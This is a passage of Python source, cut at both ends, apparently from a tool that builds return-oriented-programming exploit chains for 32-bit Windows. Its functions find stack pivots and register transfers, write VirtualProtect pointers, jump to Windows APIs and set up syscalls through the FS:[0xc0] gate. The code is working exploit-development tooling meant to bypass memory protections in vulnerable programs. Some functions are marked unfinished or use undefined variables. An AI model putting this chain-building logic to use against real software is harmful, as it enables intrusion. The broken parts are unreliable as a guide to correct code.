						if reg != reg2 and reg != newTransferReg:
							if outEmObj.verifyValSame(reg,newTransferReg):
								# print (cya,out,res)
								# print (red)
								# outEmObj.show()
								# print(res)
								# c2Search=re.findall('ret 0x[0-9a-f]+|ret \d', out)
								# if c2Search:
								# 	c2Ret=c2Search[0].split("ret ")
								# 	try:
								# 		c2Amt=int(c2Ret[1],16)
								# 	except:
								# 		c2Amt=int(c2Ret[1])
								c2Amt=calcC2Amount(p)
								if c2Amt!=0:
									modulo=c2Amt % 4
									if modulo!=0:
										continueFlag=True
								return True, p, newTransferReg, stackPivotAmount,myDict[p].opcode,c2Amt
				if continueFlag:
					continue
		return False, 0,0,0,0,0
	except Exception as e:
		dp  ("oh no")
		dp (e)
		dp (traceback.format_exc())
	return False, 0,0,0,0,0

def findMovRegSpecial(reg1, bad,length1,excludeRegs,espDesiredMovement):
	#reg 1 - the one we want
	#reg2 = secondary - will transfer
	findXchgMovRegSpecial


	##### THIS HAS NOT BEEN BUILT YET, JUST COPIED SOME OVER FROM findXchgMovRegSpecial
	###!!!!!!!!!!!!!!!!!!!!!!!!!!
	###!!!!!!!!!!!!!!!!!!!!!!!!!!	
	###!!!!!!!!!!!!!!!!!!!!!!!!!!	
	###!!!!!!!!!!!!!!!!!!!!!!!!!!	


	dp ("mov", reg1)
	instruction="mov"
	bExists, myDict=fg.getFg(instruction,reg1)
	if bExists:
		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad and ((myDict[p].op2==reg1 and not myDict[p].op1==reg1 ) or (myDict[p].op1==reg1 and myDict[p].op2==reg1 )):
					dp ("found ",instruction, reg1, "ops", myDict[p].op1, myDict[p].op2)
					if reg1 not in myDict[p].op1:
						return True,p, myDict[p].op1
					else:
						return True,p, myDict[p].op2

			dp ("findXchg returning False" )
			return False,0,0
		if not length1: # was else
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
				freeBad=False
				if myDict[p].opcode=="c3" and freeBad and ((myDict[p].op2==reg1 and not myDict[p].op1==reg1 ) or (myDict[p].op1==reg1 and myDict[p].op2==reg1 )):
					return True,p, myDict
				dp (instruction," clob")
				mdExist, m1, myDict, rObj = rop_testerFindClobberFree((instruction,reg1), excludeRegs,bad, "c3", espDesiredMovement,[])
				if mdExist and myDict[p].op2==op2:
					dp ("found alt", instruction, reg1)
					
					if reg1 not in myDict[p].op1:
						return True,m, myDict[p].op1
					else:
						return True,m, myDict[p].op2
				else:
					return False,0,0
	else:
		# dp ("return false ", instruction)
		return False,0,0
def genFiller(fillerAmt, customHex=None):
	fillerAmt+=1
	fillers=[]
	need=fillerAmt /4
	# modulo=fillerAmt % 4
	# print ("modulo", modulo)
	need=int(need)
	for x in range(need):
		if customHex==None:
			fillers.append(0x41414141)		
		else:
			fillers.append(customHex)		

	return fillers

def adjustForC2(fillerAmt, myPk,offset):
	filler=genFiller(fillerAmt, 0x43434343)
	showChain(myPk, True)
	
	myPk[offset].modStackAddFirst(filler)
	print ("after",gre)
	showChain(myPk, True)
	print (res)
	# gT4[0].modStackAddFirst(filler2)

def findStackPivot(reg,bad,length1, excludeRegs,regsNotUsed,comment):
	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	excludeRegs=list(set(excludeRegs))
	espDesiredMovement=0

	for reg in excludeRegs:
		availableRegs.remove(reg)

	foundMEsp, mEsp = findMovEsp(reg,bad,length1, excludeRegs,espDesiredMovement)
	if foundMEsp:
		cMEsp=chainObj(mEsp, "Save esp to "+reg+" - " + comment, [])
	if not foundMEsp:
		foundMEsp, mEsp,newReg, stackPivotAmount,c3Status,c2Adjust = getPushPopESP(reg,excludeRegs,espDesiredMovement,True,True,comment)
		if foundMEsp:
			if stackPivotAmount ==0:
				cMEsp=chainObj(mEsp,  "Save esp to "+reg + " - " + comment, [])
			else:
				filler=genFiller(stackPivotAmount)
				cMEsp=chainObj(mEsp,  "Save esp to "+reg + " - " + comment, filler)		

	if  foundMEsp:
		package=pkBuild([cMEsp])
		showChain(package)
		return True, package

	availableRegs2= copy.deepcopy(availableRegs)
	if reg in availableRegs2:
		availableRegs2.remove(reg)

	for r2 in availableRegs2:
		foundMEsp, mEsp,newReg, stackPivotAmount,c3Status,c2Adjust = getPushPopESP(r2,excludeRegs,espDesiredMovement,True,True,comment)
		if foundMEsp:
			if stackPivotAmount ==0:
				cMEsp=chainObj(mEsp,  "Save esp to "+reg + " - " + comment, [])
			else:
				filler=genFiller(stackPivotAmount)
				cMEsp=chainObj(mEsp,  "Save esp to "+reg + " - " + comment, filler)	
				
				availableRegs4= copy.deepcopy(availableRegs2)
				availableRegs4.remove(r2)
				for r4  in availableRegs4:
					foundT, gT = findUniTransfer("sp1",r4,r2, bad,length1,excludeRegs,espDesiredMovement, "Transfer " +r2+" to " + r4)
					if foundT:
						package=pkBuild([cMEsp,gT])
						showChain(package)
						return True, package	

		foundMEsp, mEsp = findMovEsp(r2,bad,length1, excludeRegs,espDesiredMovement)
		if foundMEsp and 2==3:
			cMEsp=chainObj(mEsp, "Save esp to "+reg+" - " + comment, [])
			if foundMEsp:
				availableRegs3= copy.deepcopy(availableRegs2)
				availableRegs3.remove(r2)
				for r3  in availableRegs3:
					foundT, gT = findUniTransfer("sp1",r3,r2, bad,length1,excludeRegs,espDesiredMovement, "Transfer " +r2+" to " + r3)
					if foundT:
						package=pkBuild([cMEsp,gT])
						showChain(package)
						return True, package	

	if not foundMEsp:
		# print ("continue foundMEsp2")
		return False,0

def findMovDerefGetStackOld(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement,distEsp):
	dp ("***regsNotUsed", regsNotUsed)
	try:
		for op2 in regsNotUsed:
			excludeRegs2= copy.deepcopy(excludeRegs)
			excludeRegs2.append(op2)
			foundL1, p2, chP = loadReg(op2,bad,length1,excludeRegs2,distEsp)
			if not foundL1:
				dp ("continue p2")
				continue
			foundMEsp, mEsp = findMovEsp(reg,bad,length1, excludeRegs2,espDesiredMovement)
			if foundMEsp:
				cMEsp=chainObj(mEsp, "Save esp to "+reg, [])
			if not foundMEsp:
			# if 1==1:
				# foundT, mEsp = xchgMovReg("esp",reg, bad,length1,excludeRegs2,espDesiredMovement)
				# 	cMEsp=chainObj(mEsp, "Save esp to "+reg, [])
				# if not foundT:				
				# foundT, mEsp,newReg = findMovRegSpecial("esp", bad,length1,excludeRegs2,espDesiredMovement)
				# print ("continue mEsp")
				foundMEsp, mEsp,newReg, stackPivotAmount,c3Status,c2Adjust = getPushPopESP(reg,excludeRegs2,espDesiredMovement,True,True)
				if foundMEsp:
					if stackPivotAmount ==0:
						cMEsp=chainObj(mEsp,  "Save esp to "+reg, [])
					else:
						filler=genFiller(stackPivotAmount)
						cMEsp=chainObj(mEsp,  "Save esp to "+reg, filler)
					# showChain(pkBuild([cMEsp]),True)
					# print ("stackPivotAmount", stackPivotAmount)
					# print ("regsNotUsed", regsNotUsed)
					# print ("excludeRegs2", excludeRegs2)
					# home
				if not foundMEsp:
					foundMEsp, mEsp,newReg, stackPivotAmount,c3Status,c2Adjust = getPushPopESP(reg,excludeRegs2,espDesiredMovement,False,False)
				if foundMEsp:
					cMEsp=chainObj(0x56ee7f,  "Save esp to "+reg, [0xdeadc0de,0xdeadc0de])
					foundT4, gT4 = findUniTransfer("14",reg,newReg, bad,length1,excludeRegs2,0, "Transfer to " + reg)
					if foundT4:
						filler2=[]
						if stackPivotAmount ==0:
							cMEsp=chainObj(mEsp,  "Save esp to "+reg, [])
							# if c3Status!="c3":
							# 	cMEsp=chainObj(mEsp,  "Save esp to "+reg,[])
							# 	filler2=genFiller(c2Adjust)
							# 	gT4[0].modStackAddFirst(filler2)
						else:
							filler=genFiller(stackPivotAmount)
							cMEsp=chainObj(mEsp,  "Save esp to "+reg, filler)
							# showChain([cMEsp],True)
							test=pkBuild([cMEsp])
							# showChain(test,True)
							# if c3Status!="c3": 
							# 	filler2=genFiller(c2Adjust)
								# print (cya)
								# temp=pkBuild([gT4])
								# showChain(temp,True)
								# gT4[0].modStackAddFirst(filler2)
								# temp2=pkBuild([gT4[0]])
								# print (yel)
								# print(33)
								# showChain(temp2,True)
								# print(res)
						
						cMEsp=pkBuild([cMEsp,gT4])
				
			if not foundMEsp:
				# print ("continue foundMEsp2")
				continue
			foundAdd, a1 = findGenericOp2("add", op2,reg,bad,length1, excludeRegs2,espDesiredMovement)
			if not foundAdd:
				# print ("continue a1")
				continue
			if foundL1 and foundAdd and foundMEsp:
				# cMEsp=chainObj(mEsp, "Save esp to "+reg, [])
				cA=chainObj(a1, "Adjust " +reg +" to parameter ", [])
				
				package=pkBuild([cMEsp,chP,cA])
				# print ("get esp",gre)
				# showChain(package,True)
				# print(res)
				return True, package
		# print ("findMovDerefGetStack return false")
		return False, -0x666
	except Exception as e:
		print ("exception 2", sysTarget)
		print(e)
		print(traceback.format_exc())


def findMovDerefGetStack(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement,distEsp):
	dp ("***regsNotUsed", regsNotUsed)
	try:
		for op2 in regsNotUsed:
			cMEsp=0
			excludeRegs2= copy.deepcopy(excludeRegs)
			excludeRegs2.append(op2)
			foundL1, p2, chP = loadReg(op2,bad,length1,excludeRegs2,distEsp)
			if not foundL1:
				dp ("continue p2")
				continue
			foundMEsp, mEsp = findMovEsp(reg,bad,length1, excludeRegs2,espDesiredMovement)
			if foundMEsp:
				cMEsp=chainObj(mEsp, "Save esp to "+reg, [])
			if not foundMEsp:
				foundMEsp, mEsp,newReg, stackPivotAmount,c3Status,c2Adjust = getPushPopESP(reg,excludeRegs2,espDesiredMovement,True,True)
				if foundMEsp:
					if stackPivotAmount ==0:
						cMEsp=chainObj(mEsp,  "Save esp to "+reg, [])
					else:
						filler=genFiller(stackPivotAmount)
						cMEsp=chainObj(mEsp,  "Save esp to "+reg, filler)
				if not foundMEsp:
					foundMEsp, mEsp,newReg, stackPivotAmount,c3Status,c2Adjust = getPushPopESP(reg,excludeRegs2,espDesiredMovement,False,False)
					if foundMEsp:
						# print ("yes")
						# cMEsp=chainObj(0x56ee7f,  "Save esp to "+reg, [0xdeadc0de,0xdeadc0de])
						foundT4, gT4 = findUniTransfer("15",reg,newReg, bad,length1,excludeRegs2,0, "Transfer to " + reg)
						if foundT4:
							filler2=[]
							if stackPivotAmount ==0:
								cMEsp=chainObj(mEsp,  "Save esp to "+reg, [])
								# if c3Status!="c3":
								# 	cMEsp=chainObj(mEsp,  "Save esp to "+reg,[])
								# 	filler2=genFiller(c2Adjust)
								# 	gT4[0].modStackAddFirst(filler2)
							else:
								filler=genFiller(stackPivotAmount)
								cMEsp=chainObj(mEsp,  "Save esp to "+reg, filler)
								# if c3Status!="c3": 
								# 	filler2=genFiller(c2Adjust)
								# 	gT4[0].modStackAddFirst(filler2)
							cMEsp=pkBuild([cMEsp,gT4])
							# print ("done", cMEsp)
						else:
							foundMEsp=False
			if not foundMEsp:
				# print ("continue foundMEsp2")
				continue
			foundAdd, a1 = findGenericOp2("add", op2,reg,bad,length1, excludeRegs2,espDesiredMovement)
			if not foundAdd:
				# print ("continue a1")
				continue
			if foundL1 and foundAdd and foundMEsp:
				# cMEsp=chainObj(mEsp, "Save esp to "+reg, [])
				cA=chainObj(a1, "Adjust " +reg +" to parameter ", [])
				package=pkBuild([cMEsp,chP,cA])
				return True, package
		# print ("findMovDerefGetStack return false")
		return False, -0x666
	except Exception as e:
		print ("exception 2")
		print(e)
		print(traceback.format_exc())


def findMovDerefGetStackNotReg(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement,distEsp):

	#### TODO: rebuild so focus is on findStackPivot and Add reg reg. Those are the more obscure ones. can use a transfer on stack pointer. should make it a lot easier.
	# dp ("findMovDerefGetStack", reg)
	if "eax" not in excludeRegs:
		excludeRegs.append("eax")
	for op2 in regsNotUsed:
		altPath=False
		foundL1, p2, chP = loadReg(op2,bad,length1,excludeRegs,distEsp)
		if not foundL1:
			dp ("continue p2")
			continue
		regsNotUsed2= copy.deepcopy(regsNotUsed)
		regsNotUsed2.remove(op2)
		excludeRegs2= copy.deepcopy(excludeRegs)
		
		for op3 in regsNotUsed2:
			foundStart, chSP=findStackPivot(op3,bad,length1, excludeRegs,availableRegs,"")
			if foundStart:
				# pk=pkBuild([chSP])
				# showChain(pk,True)
				excludeRegs2.append(op3)
				break
		if not foundStart:
			# print ("continue foundMEsp")
			continue

		foundAdd, a1 = findGenericOp2("add", op2,op3,bad,length1, excludeRegs2,espDesiredMovement)
		if not foundAdd:
			# print ("continue a1", op2, op3, "reg")
			continue

		foundT, gT = findMovDeref(op3,"eax",bad,length1, excludeRegs2,False)
		# foundT=False
		if not foundT:
			regsNotUsed3= copy.deepcopy(regsNotUsed)
			for r3 in regsNotUsed3:
				foundT2, gTb = findUniTransfer("17b",r3,"eax", bad,length1,excludeRegs2,0, "Transfer to " + reg)
				if foundT2:
					foundT, m2 = findMovDeref(op3,r3,bad,length1, excludeRegs2,False)
					if foundT:
						altPath=True
						# pk=pkBuild([gTb,m2])
						# showChain(pk,True)
						break
		if not altPath:
			foundT4, gT2 = findUniTransfer("17",reg,op3, bad,length1,excludeRegs2,0, "Transfer to " + reg)
		else:
			foundT4, gT2 = findUniTransfer("17",reg,r3, bad,length1,excludeRegs2,0, "Transfer to " + reg)
			# if foundT4:
			# 	pk=pkBuild([gTb,m2, gT2])
			# 	showChain(pk,True)
		if foundL1 and foundAdd and foundStart and foundT4 and foundT:
			cA=chainObj(a1, "Adjust " +reg +" to parameter2", [])
			if not altPath:
				package=pkBuild([chSP,chP,cA,gT,gT2])
			else:
				package=pkBuild([chSP,chP,cA,gTb,m2,gT2])
			# showChain(package, True)
			return True, package
	return False, -0x666

def buildJmpToAPI(reg, bad,length1, excludeRegs,regsNotUsed,espDesiredMovement,winAPi,gMd,distFinalESP,curPk,distEsp,destAfter,IncDec,numP,compensate,sysTarget):
	for op2 in regsNotUsed:
		foundL1, p3, gPv = loadReg(op2,bad,length1,excludeRegs, winAPi)
		foundJ, j1=findJmpDword(op2,bad)
		comJ="Ptr to " + disMini(fg.rop[j1].raw,j1)
		if foundL1 and foundJ:
			break

	foundL2, p2, gP = loadReg(reg,bad,length1,excludeRegs,img(j1), comJ)
	gMd2=CopyChainObj(gMd,"Write ptr to Jmp ["+reg+"] to mem" )
	earlyStuff=pk=pkBuild([gP,gMd2,gPv])
	curPk=curPk+earlyStuff
	dp ("buildJmpToAPI compensate", compensate)
	if foundL1 and foundJ and foundL2:
		regsNotUsed.remove(op2)
		foundESPFinal, pkEnd =findChangeESP(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement,distFinalESP, curPk,distEsp,destAfter,IncDec,numP,compensate, "winApi",sysTarget,PWinApi)
		dp ("buildJmpToAPI")
		showChain(pkEnd)

	if foundESPFinal:
		pk=pkBuild([gP,gMd2,gPv,pkEnd]) #pkFn,pkD
		return True,pk
	return False,0



def buildLPWinAPI(orgOp2,derefReg, bad,length1, excludeRegs,regsNotUsed,espDesiredMovement,pVP, gIncDec,gMd,comment):

	##### try the mov first -- may have to try others!!!
	
	foundL1, p2, gP = loadReg(orgOp2,bad,length1,excludeRegs,pVP,comment)
	foundM1, m2 = findMovDeref2Old(orgOp2,orgOp2,bad,length1, excludeRegs,espDesiredMovement)
	dp ("foundM1", foundM1)
	# foundL1=False
	if foundM1 and foundL1:
		gM2=chainObj(m2, "Dereference(2) " +orgOp2 , [])
		gMd2=CopyChainObj(gMd,"Write VP to mem" )
		package=[gP,gM2]
		package.append(gMd)
		package=pkBuild([package])
		dp ("vp show")
		# showChain(package)
		return True,package

	### reg not available - we will need to do something else and then switch
	regsNotUsed.remove(orgOp2)
	excludeRegs2,regsNotUsed2= regsAvailtoExclude(regsNotUsed,excludeRegs)

	for op2 in regsNotUsed2:
		foundL1, p2, gP = loadReg(op2,bad,length1,excludeRegs2,pVP)
		if not foundL1:
			dp ("continue p2")
			continue
		foundM1, m2 = findMovDeref2(op2,op2,bad,length1, excludeRegs2,espDesiredMovement)
		dp ("foundM1", foundM1)
		foundT, x1 = xchgMovReg(orgOp2,op2, bad,length1,excludeRegs2,espDesiredMovement)
		if foundT:
			gT=chainObj(x1, "Move VirtualProtect to " + orgOp2 , [])
			gT=[gT]
		if not foundT:	
			foundT, gT = findUniTransfer("18-buildLPWinAPI",orgOp2,op2, bad,length1,excludeRegs2,espDesiredMovement, "Transfer VP to " + orgOp2)

		if foundM1 and foundL1 and foundT:
			gM2=chainObj(m2, "Dereference(3) " +op2 +" and move to " , [])
			gMd2=CopyChainObj(gMd,"Write VP to mem" )
			package=[gP,gM2]
			package.extend(gT)
			package.append(gMd2)
			# showChain(package)
			package=pkBuild([package])
			return True,package
		else:
			pass
	return False, 0


def buildLPorRA2(reg,derefReg, bad,length1, excludeRegs,regsNotUsed,espDesiredMovement, gIncDec,pMovD,comment):
	cM=chainObj(pMovD, "Write param to mem - " + comment, [])

	package=[cM, gIncDec,gIncDec,gIncDec,gIncDec]
	showChain(package)
	return package

def buildLPorRA1(reg,derefReg, bad,length1, excludeRegs,regsNotUsed,espDesiredMovement,distParam, gIncDec,gMovD,comment):
	dp ("buildLPorRA1", reg, "distParam", hex(distParam))
	dp ("regsNotUsed", regsNotUsed, "derefReg", derefReg, "reg", reg)
	# regsNotUsed.remove(reg)
	for op2 in regsNotUsed:
		dp ("regsNotUsed", regsNotUsed, "derefReg", derefReg, "reg", reg, "op2", op2)

		regsNotUsed2= copy.deepcopy(regsNotUsed)
		regsNotUsed2.remove(op2)
		# foundL1, p2, chP = loadReg(op2,bad,length1,excludeRegs,val)
		# if not foundL1:
		# 	dp ("continue p2")
		# 	continue
		# foundMEsp, mEsp = findMovEsp(reg,bad,length1, excludeRegs,espDesiredMovement)
		# if not foundMEsp:
		# 	dp ("continue mEsp")
		# 	continue
		for load2 in regsNotUsed2:
			dp ("load2",load2, "distParam2", hex(distParam))
			excludeRegs2,regsNotUsed2= regsAvailtoExclude(regsNotUsed,excludeRegs)

			foundL1, p3, chP = loadReg(load2,bad,length1,excludeRegs2,distParam)
			if not foundL1:
				dp ("continue p2")
				continue
			foundA1, a1 = findGenericOp2("add", load2,op2,bad,length1, excludeRegs,espDesiredMovement)
			if not foundA1:
				dp ("continue a1")
				continue
			if foundL1 and foundA1:
				break
		if not foundL1 or not foundA1:
			continue
		foundM1, m1 = findGenericOp2("mov", reg,op2,bad,length1, excludeRegs,espDesiredMovement)
		if not foundM1:
			dp ("continue a1")
			continue
		
		# if foundL1 and foundAdd and foundMEsp:
		if foundM1 and foundL1 and foundA1:
			if derefReg != op2:
				dp ("THEY ARE NOT THE SAME", derefReg,op2)
				foundX, x1 = xchgMovReg(derefReg,op2, bad,length1,excludeRegs,espDesiredMovement)
				if foundX:
					cX=chainObj(x1, "", [])
					cM=chainObj(m1, "Move " + reg, [])
					# cP=chainObj(p3, "Load " + op2, [distParam])
					cP=chP
					cA=chainObj(a1, "Get to " + comment, [])
					test2=pkBuild([cM,chP,cA,cX,gMovD,gIncDec,gIncDec,gIncDec,gIncDec])
					showChain(test2)
					return True, test2
				else:
					dp ("xchg not found!!!")
			else:
				dp ("THEY ARE THE SAME", derefReg,op2)

				cM=chainObj(m1, "Get point of reference to esp in " + reg, [])
				# cP=chainObj(p3, "Load " + op2, [distParam])
				cA=chainObj(a1, "Get to " + comment, [])
				
				test2=pkBuild([cM,chP,cA,gMovD,gIncDec,gIncDec,gIncDec,gIncDec])
				showChain(test2)
				return True, test2
	return False,0

def findJmpDword(reg,bad):
	bExists, myDict=fg.getFg("jmpDword",reg)
	if bExists:
		for p in myDict:
			freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

			if freeBad:
				# dp ("returning ", hex(p))
				return True,p
	return False,-1
def findJmp(reg,bad):
	bExists, myDict=fg.getFg("jmp",reg)
	if bExists:
		for p in myDict:
			freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

			if freeBad:
				dp ("returning ", hex(p))
				return True,p
	return False,-1
def helperMovDerefCopy(reg,op2,bad,length1, regsNotUsed,espDesiredMovement,val,comment, comment2=None):
	# foundM1, m1 = findMovDeref(reg,op2,bad,length1, excludeRegs)
	# if not foundM1:
	# 	return False,0
	# foundL1, p1, chP = loadReg(op2,bad,True,regsNotUsed,val,comment)
	# if not foundL1:
	# 	return False,0
	# foundInc, i1 = findGeneric("dec",reg,bad,length1, regsNotUsed)
	
	# if not foundInc:
	# 	return False,0
	# if foundM1 and foundL1 and foundInc:
	# 	dp ("found condition build findMovDeref ops:", op2)
	if comment2==None:
		cM=chainObj(m1, "Write param to mem", [])
	else:
		cM=chainObj(m1, comment2, [])
	cI=chainObj(i1, "Decrement " + reg, [])
	package=([chP,cM, cI,cI,cI,cI])
	return True, package


def regsAvailtoExclude(availableRegs, eRegs=None,newReg=None):
	dp ("regsAvailtoExclude")
	regs=["eax","ebx","ecx","edx", "esi","edi","ebp"]
	# availableRegs=set(availableRegs)
	exclude=[]
	
	for r in regs:
		if r not in availableRegs:
			exclude.append(r)
	dp ("exclude", exclude)

	if eRegs==None:
		return exclude

	if eRegs!=None:	
		eRegs=set(eRegs)
		exclude=set(exclude)
		exclude=exclude | eRegs
		exclude=list(exclude)

	# print ("regsExclude", exclude)
	# print("old available", availableRegs)
	availableRegs	= list(set(regs)-set(exclude))
	# print ("new available", availableRegs)
	
	return exclude, availableRegs
def helperMovDeref(reg,op2,bad,length1, regsNotUsed,espDesiredMovement,val,mReg=None,dReg=None,comment="" ,comment2=None):
	# print ("helperMovDeref", mReg,dReg)
	excludeRegs= regsAvailtoExclude(regsNotUsed)
	m1=0
	i1=0
	if mReg==None:
		foundM1, m1 = findMovDeref(reg,op2,bad,length1, excludeRegs)
	else:
		m1=mReg
		foundM1=True
	if not foundM1:
		return False,0
	if dReg==None:
		foundInc, i1 = findGeneric("dec",reg,bad,length1, regsNotUsed,espDesiredMovement)
	else:
		i1=dReg
		foundInc=True
	if not foundInc:
		return False,0
	foundL1, p1, chP = loadReg(op2,bad,True,excludeRegs,val,comment)
	if not foundL1:
		return False,0
	
	if foundM1 and foundL1 and foundInc:
		# dp ("found condition build findMovDeref ops:", op2)
		if comment2==None:
			cM=chainObj(m1, "Write param to mem", [])
		else:
			cM=chainObj(m1, comment2, [])
		cI=chainObj(i1, "Decrement " + reg, [])
		package=pkBuild([chP,cM, cI,cI,cI,cI])
		showChain(package)
		return True, package
	else:
		return False,0
def saveMemPtrRestore(orgMemReg, excludeRegs,regsNotUsed,  bad, espDesiredMovement,length1, rTrans):
	foundTransfers=False
	excludeRegs.append(rTrans)
	try:
		regsNotUsed.remove(rTrans)
	except:
		pass
	for newMem in regsNotUsed:
		foundT2, gT2 = findUniTransfer("28",newMem,orgMemReg, bad,length1,excludeRegs,espDesiredMovement, "Save memory point of reference to " + newMem)
		if not foundT2:
			try:
				debugVal= disOffset(s1)
			except:
				debugVal = " false - none found"
			print (mag,"subdword continue 4",res, debugVal)
			continue
		
		foundT3, gT3 = findUniTransfer("29",orgMemReg,newMem, bad,length1,excludeRegs,espDesiredMovement, "Restore memory point of reference back to " + orgMemReg)
		if foundT3:
			foundTransfers=True
			break
	# try:
	# 	excludeRegs.remove(rTrans)
	# 	regsNotUsed.append(rTrans)
	if foundT2 and foundT3:
		return True, gT2, gT3, newMem
	else:
		return False, 0,0,0,0

def addExcludeRegsFromChangedRegs(excludeRegs,changedRegs):
	excludeRegs2= copy.deepcopy(excludeRegs)
	for r in changedRegs:
		if r not in excludeRegs2:
			excludeRegs2.append(r)
	return excludeRegs2

def saveMemPtrRestoreSingle(orgMemReg, newMem, excludeRegs,  bad, espDesiredMovement,length1, rTrans, changedRegs):
	# print ("saveMemPtrRestoreSingle excludeRegs", excludeRegs, "changedRegs",changedRegs)
	foundTransfers=False
	# print (orgMemReg,changedRegs)
	# print(mag)
	# for each in changedRegs:
	# 	print(each)
	# print ("orgMemReg", orgMemReg, "newMem", newMem)
	# print(res)
	if orgMemReg in changedRegs:
		changedRegs.pop(orgMemReg)
	# print(changedRegs)
	excludeRegsN= copy.deepcopy(excludeRegs)
	excludeRegsN.append(rTrans)

	for r in changedRegs:
		if r not in excludeRegsN:
			excludeRegsN.append(r)
	excludeRegsN=list(set(excludeRegsN))

	# print (gre,"saveMemPtrRestoreSingle",res,orgMemReg, newMem, mag,changedRegs, yel,excludeRegsN, res)
	
	if newMem in excludeRegsN:
		# print (cya,"new mem in excludeRegsN, this is why",res, "newMem", newMem, "excludeRegs", excludeRegs)
		return False, 0,0,0,0
	foundT2, gT2 = findUniTransfer("28",newMem,orgMemReg, bad,length1,excludeRegsN,espDesiredMovement, "Save memory point of reference to:" + newMem)
	if not foundT2:
		try:
			debugVal= disOffset(s1)
		except:
			debugVal = " false - none found"
		# print (mag,"saveMemPtrRestoreSingle trans 1 not found", newMem,orgMemReg, res, debugVal)
		# continue
	if foundT2:
		foundT3, gT3 = findUniTransfer("29",orgMemReg,newMem, bad,length1,excludeRegsN,espDesiredMovement, "Restore memory point of reference back to " + orgMemReg)
		# if not foundT3:
			# print ("saveMemPtrRestoreSingle trans 2 not found", orgMemReg,newMem)
		
	if foundT2 and foundT3:
		# print ("saveMemPtrRestore found both")
		return foundT2,foundT3, gT2, gT3, newMem
	elif foundT2:
		# print ("saveMemPtrRestore found just T2")
		return foundT2,foundT3, gT2, gT3, newMem
	else:
		return False,False, 0,0,0


def getSyscallSetup(reg,op2,bad,length1, regsNotUsed,espDesiredMovement, curPk,syscallSSN,distEsp,IncDec,numP,destAfter,distFinalESP,SyscallName,excludeRegs,m1):
	# dp ("getSyscallSetup func", "numP", numP, "distEsp", hex(distEsp))
	# print (cya,"getSyscallSetup", reg, op2,res)
	sysName=SyscallName[0]
	syscallSSN=SyscallName[1]
	loadC0=None
	chP3=0
	foundTransfers=False
	availableRegs=["ebx","ecx","edx", "esi","edi","ebp"]
	try:
		availableRegs.remove(reg)
	except:
		pass
	sysTarget=""
	excludeRegs=list(set(excludeRegs))
	foundS=False
	
	if 2==2:			
		# foundS=False
		if not foundS:
			foundS, s1, sysTarget, pkLoadSys, excludeRegs2,excludeRegs3, regsNotUsed2,loadC0,gT2,needGT2,sysStyle =  findFSSubDword(reg,op2,availableRegs,excludeRegs,bad,espDesiredMovement, curPk,length1)

	if 2==2:
		if not foundS:
			foundS, s1, sysTarget, pkLoadSys, excludeRegs2,excludeRegs3, regsNotUsed2,loadC0,gT2,needGT2,sysStyle =  findFSPushword(reg,op2,regsNotUsed,excludeRegs,bad,espDesiredMovement, curPk,length1)
		# foundS=False
	if 2==2:
		# finishedSys=False
		if not foundS:
			foundS, s1, sysTarget, pkLoadSys, excludeRegs2,excludeRegs3, regsNotUsed2,loadC0,gT2,needGT2,sysStyle =  findFSMovDword(reg,op2,availableRegs,excludeRegs,bad,espDesiredMovement, curPk,length1)
	if 2==2:			
		# foundS=False
		if not foundS:
			foundS, s1, sysTarget, pkLoadSys, excludeRegs2,excludeRegs3, regsNotUsed2,loadC0,gT2,needGT2,sysStyle =  findFSAddDword(reg,op2,availableRegs,excludeRegs,bad,espDesiredMovement, curPk,length1)
	if 2==2:			
		# foundS=False
		if not foundS:
			foundS, s1, sysTarget, pkLoadSys, excludeRegs2,excludeRegs3, regsNotUsed2,loadC0,gT2,needGT2,sysStyle =  findFSXorDword(reg,op2,availableRegs,excludeRegs,bad,espDesiredMovement, curPk,length1)
	
	if 2==2:			
		# foundS=False
		if not foundS:
			foundS, s1, sysTarget, pkLoadSys, excludeRegs2,excludeRegs3, regsNotUsed2,loadC0,gT2,needGT2,sysStyle =  findFSXchgDword(reg,op2,availableRegs,excludeRegs,bad,espDesiredMovement, curPk,length1)
		# print (cya,"*************************checking foundS",foundS,res)
	if not foundS:
		return False,0
	if foundS:
		# print ("have foundS")
		cM=chainObj(m1, "Write to mem, method to invoke syscall", [])
		foundL2, p2, chP2 = loadReg("eax",bad,True,excludeRegs2,syscallSSN," Load Syscall SSN," + hex(syscallSSN) +" to invoke " + sysName)
		pkSaveSys=pkBuild([cM])
		regsNotUsed3= copy.deepcopy(regsNotUsed2)
		pkSaveSys=pkBuild([cM])
		if loadC0!="skip":
			pkLoad0xc0=pkBuild([loadC0])

		foundL2, p2, chP2 = loadReg("eax",bad,True,excludeRegs2,syscallSSN," Load Syscall SSN," + hex(syscallSSN) +" to invoke " + sysName)
		pkLoadSsn=pkBuild([chP2])
		new=0
		if sysStyle=="pushDwordFS":
			new=pkBuild([pkLoadSys,pkSaveSys, pkLoad0xc0,pkLoadSsn])
		else:
			if loadC0!="skip":
				new=pkBuild([pkLoad0xc0,pkLoadSys,pkSaveSys,pkLoadSsn])
				if fg.rop[s1].FSIndex==reg or foundTransfers or needGT2:# and sysStyle !="subdword":
					# print ("gT2", gT2)
					new=pkBuild([gT2,pkLoad0xc0,pkLoadSys,pkSaveSys,pkLoadSsn])
			else:
				new=pkBuild([pkLoadSys,pkSaveSys,pkLoadSsn])
		curPk=pkBuild([curPk, new])

		compensate=0x0
		dp ("excludeRegs2", excludeRegs2, "reg",reg, "regsNotUsed3", regsNotUsed3)		
		foundESPFinal, pkEnd =findChangeESP(reg,bad,length1, excludeRegs3,regsNotUsed3,espDesiredMovement,distFinalESP,curPk,distEsp,destAfter,IncDec,numP,compensate,"sysInvoke",sysTarget)
		if foundESPFinal:
			pkSysSetup=pkBuild([new,pkEnd])
			dp ("pkEnd", pkEnd)
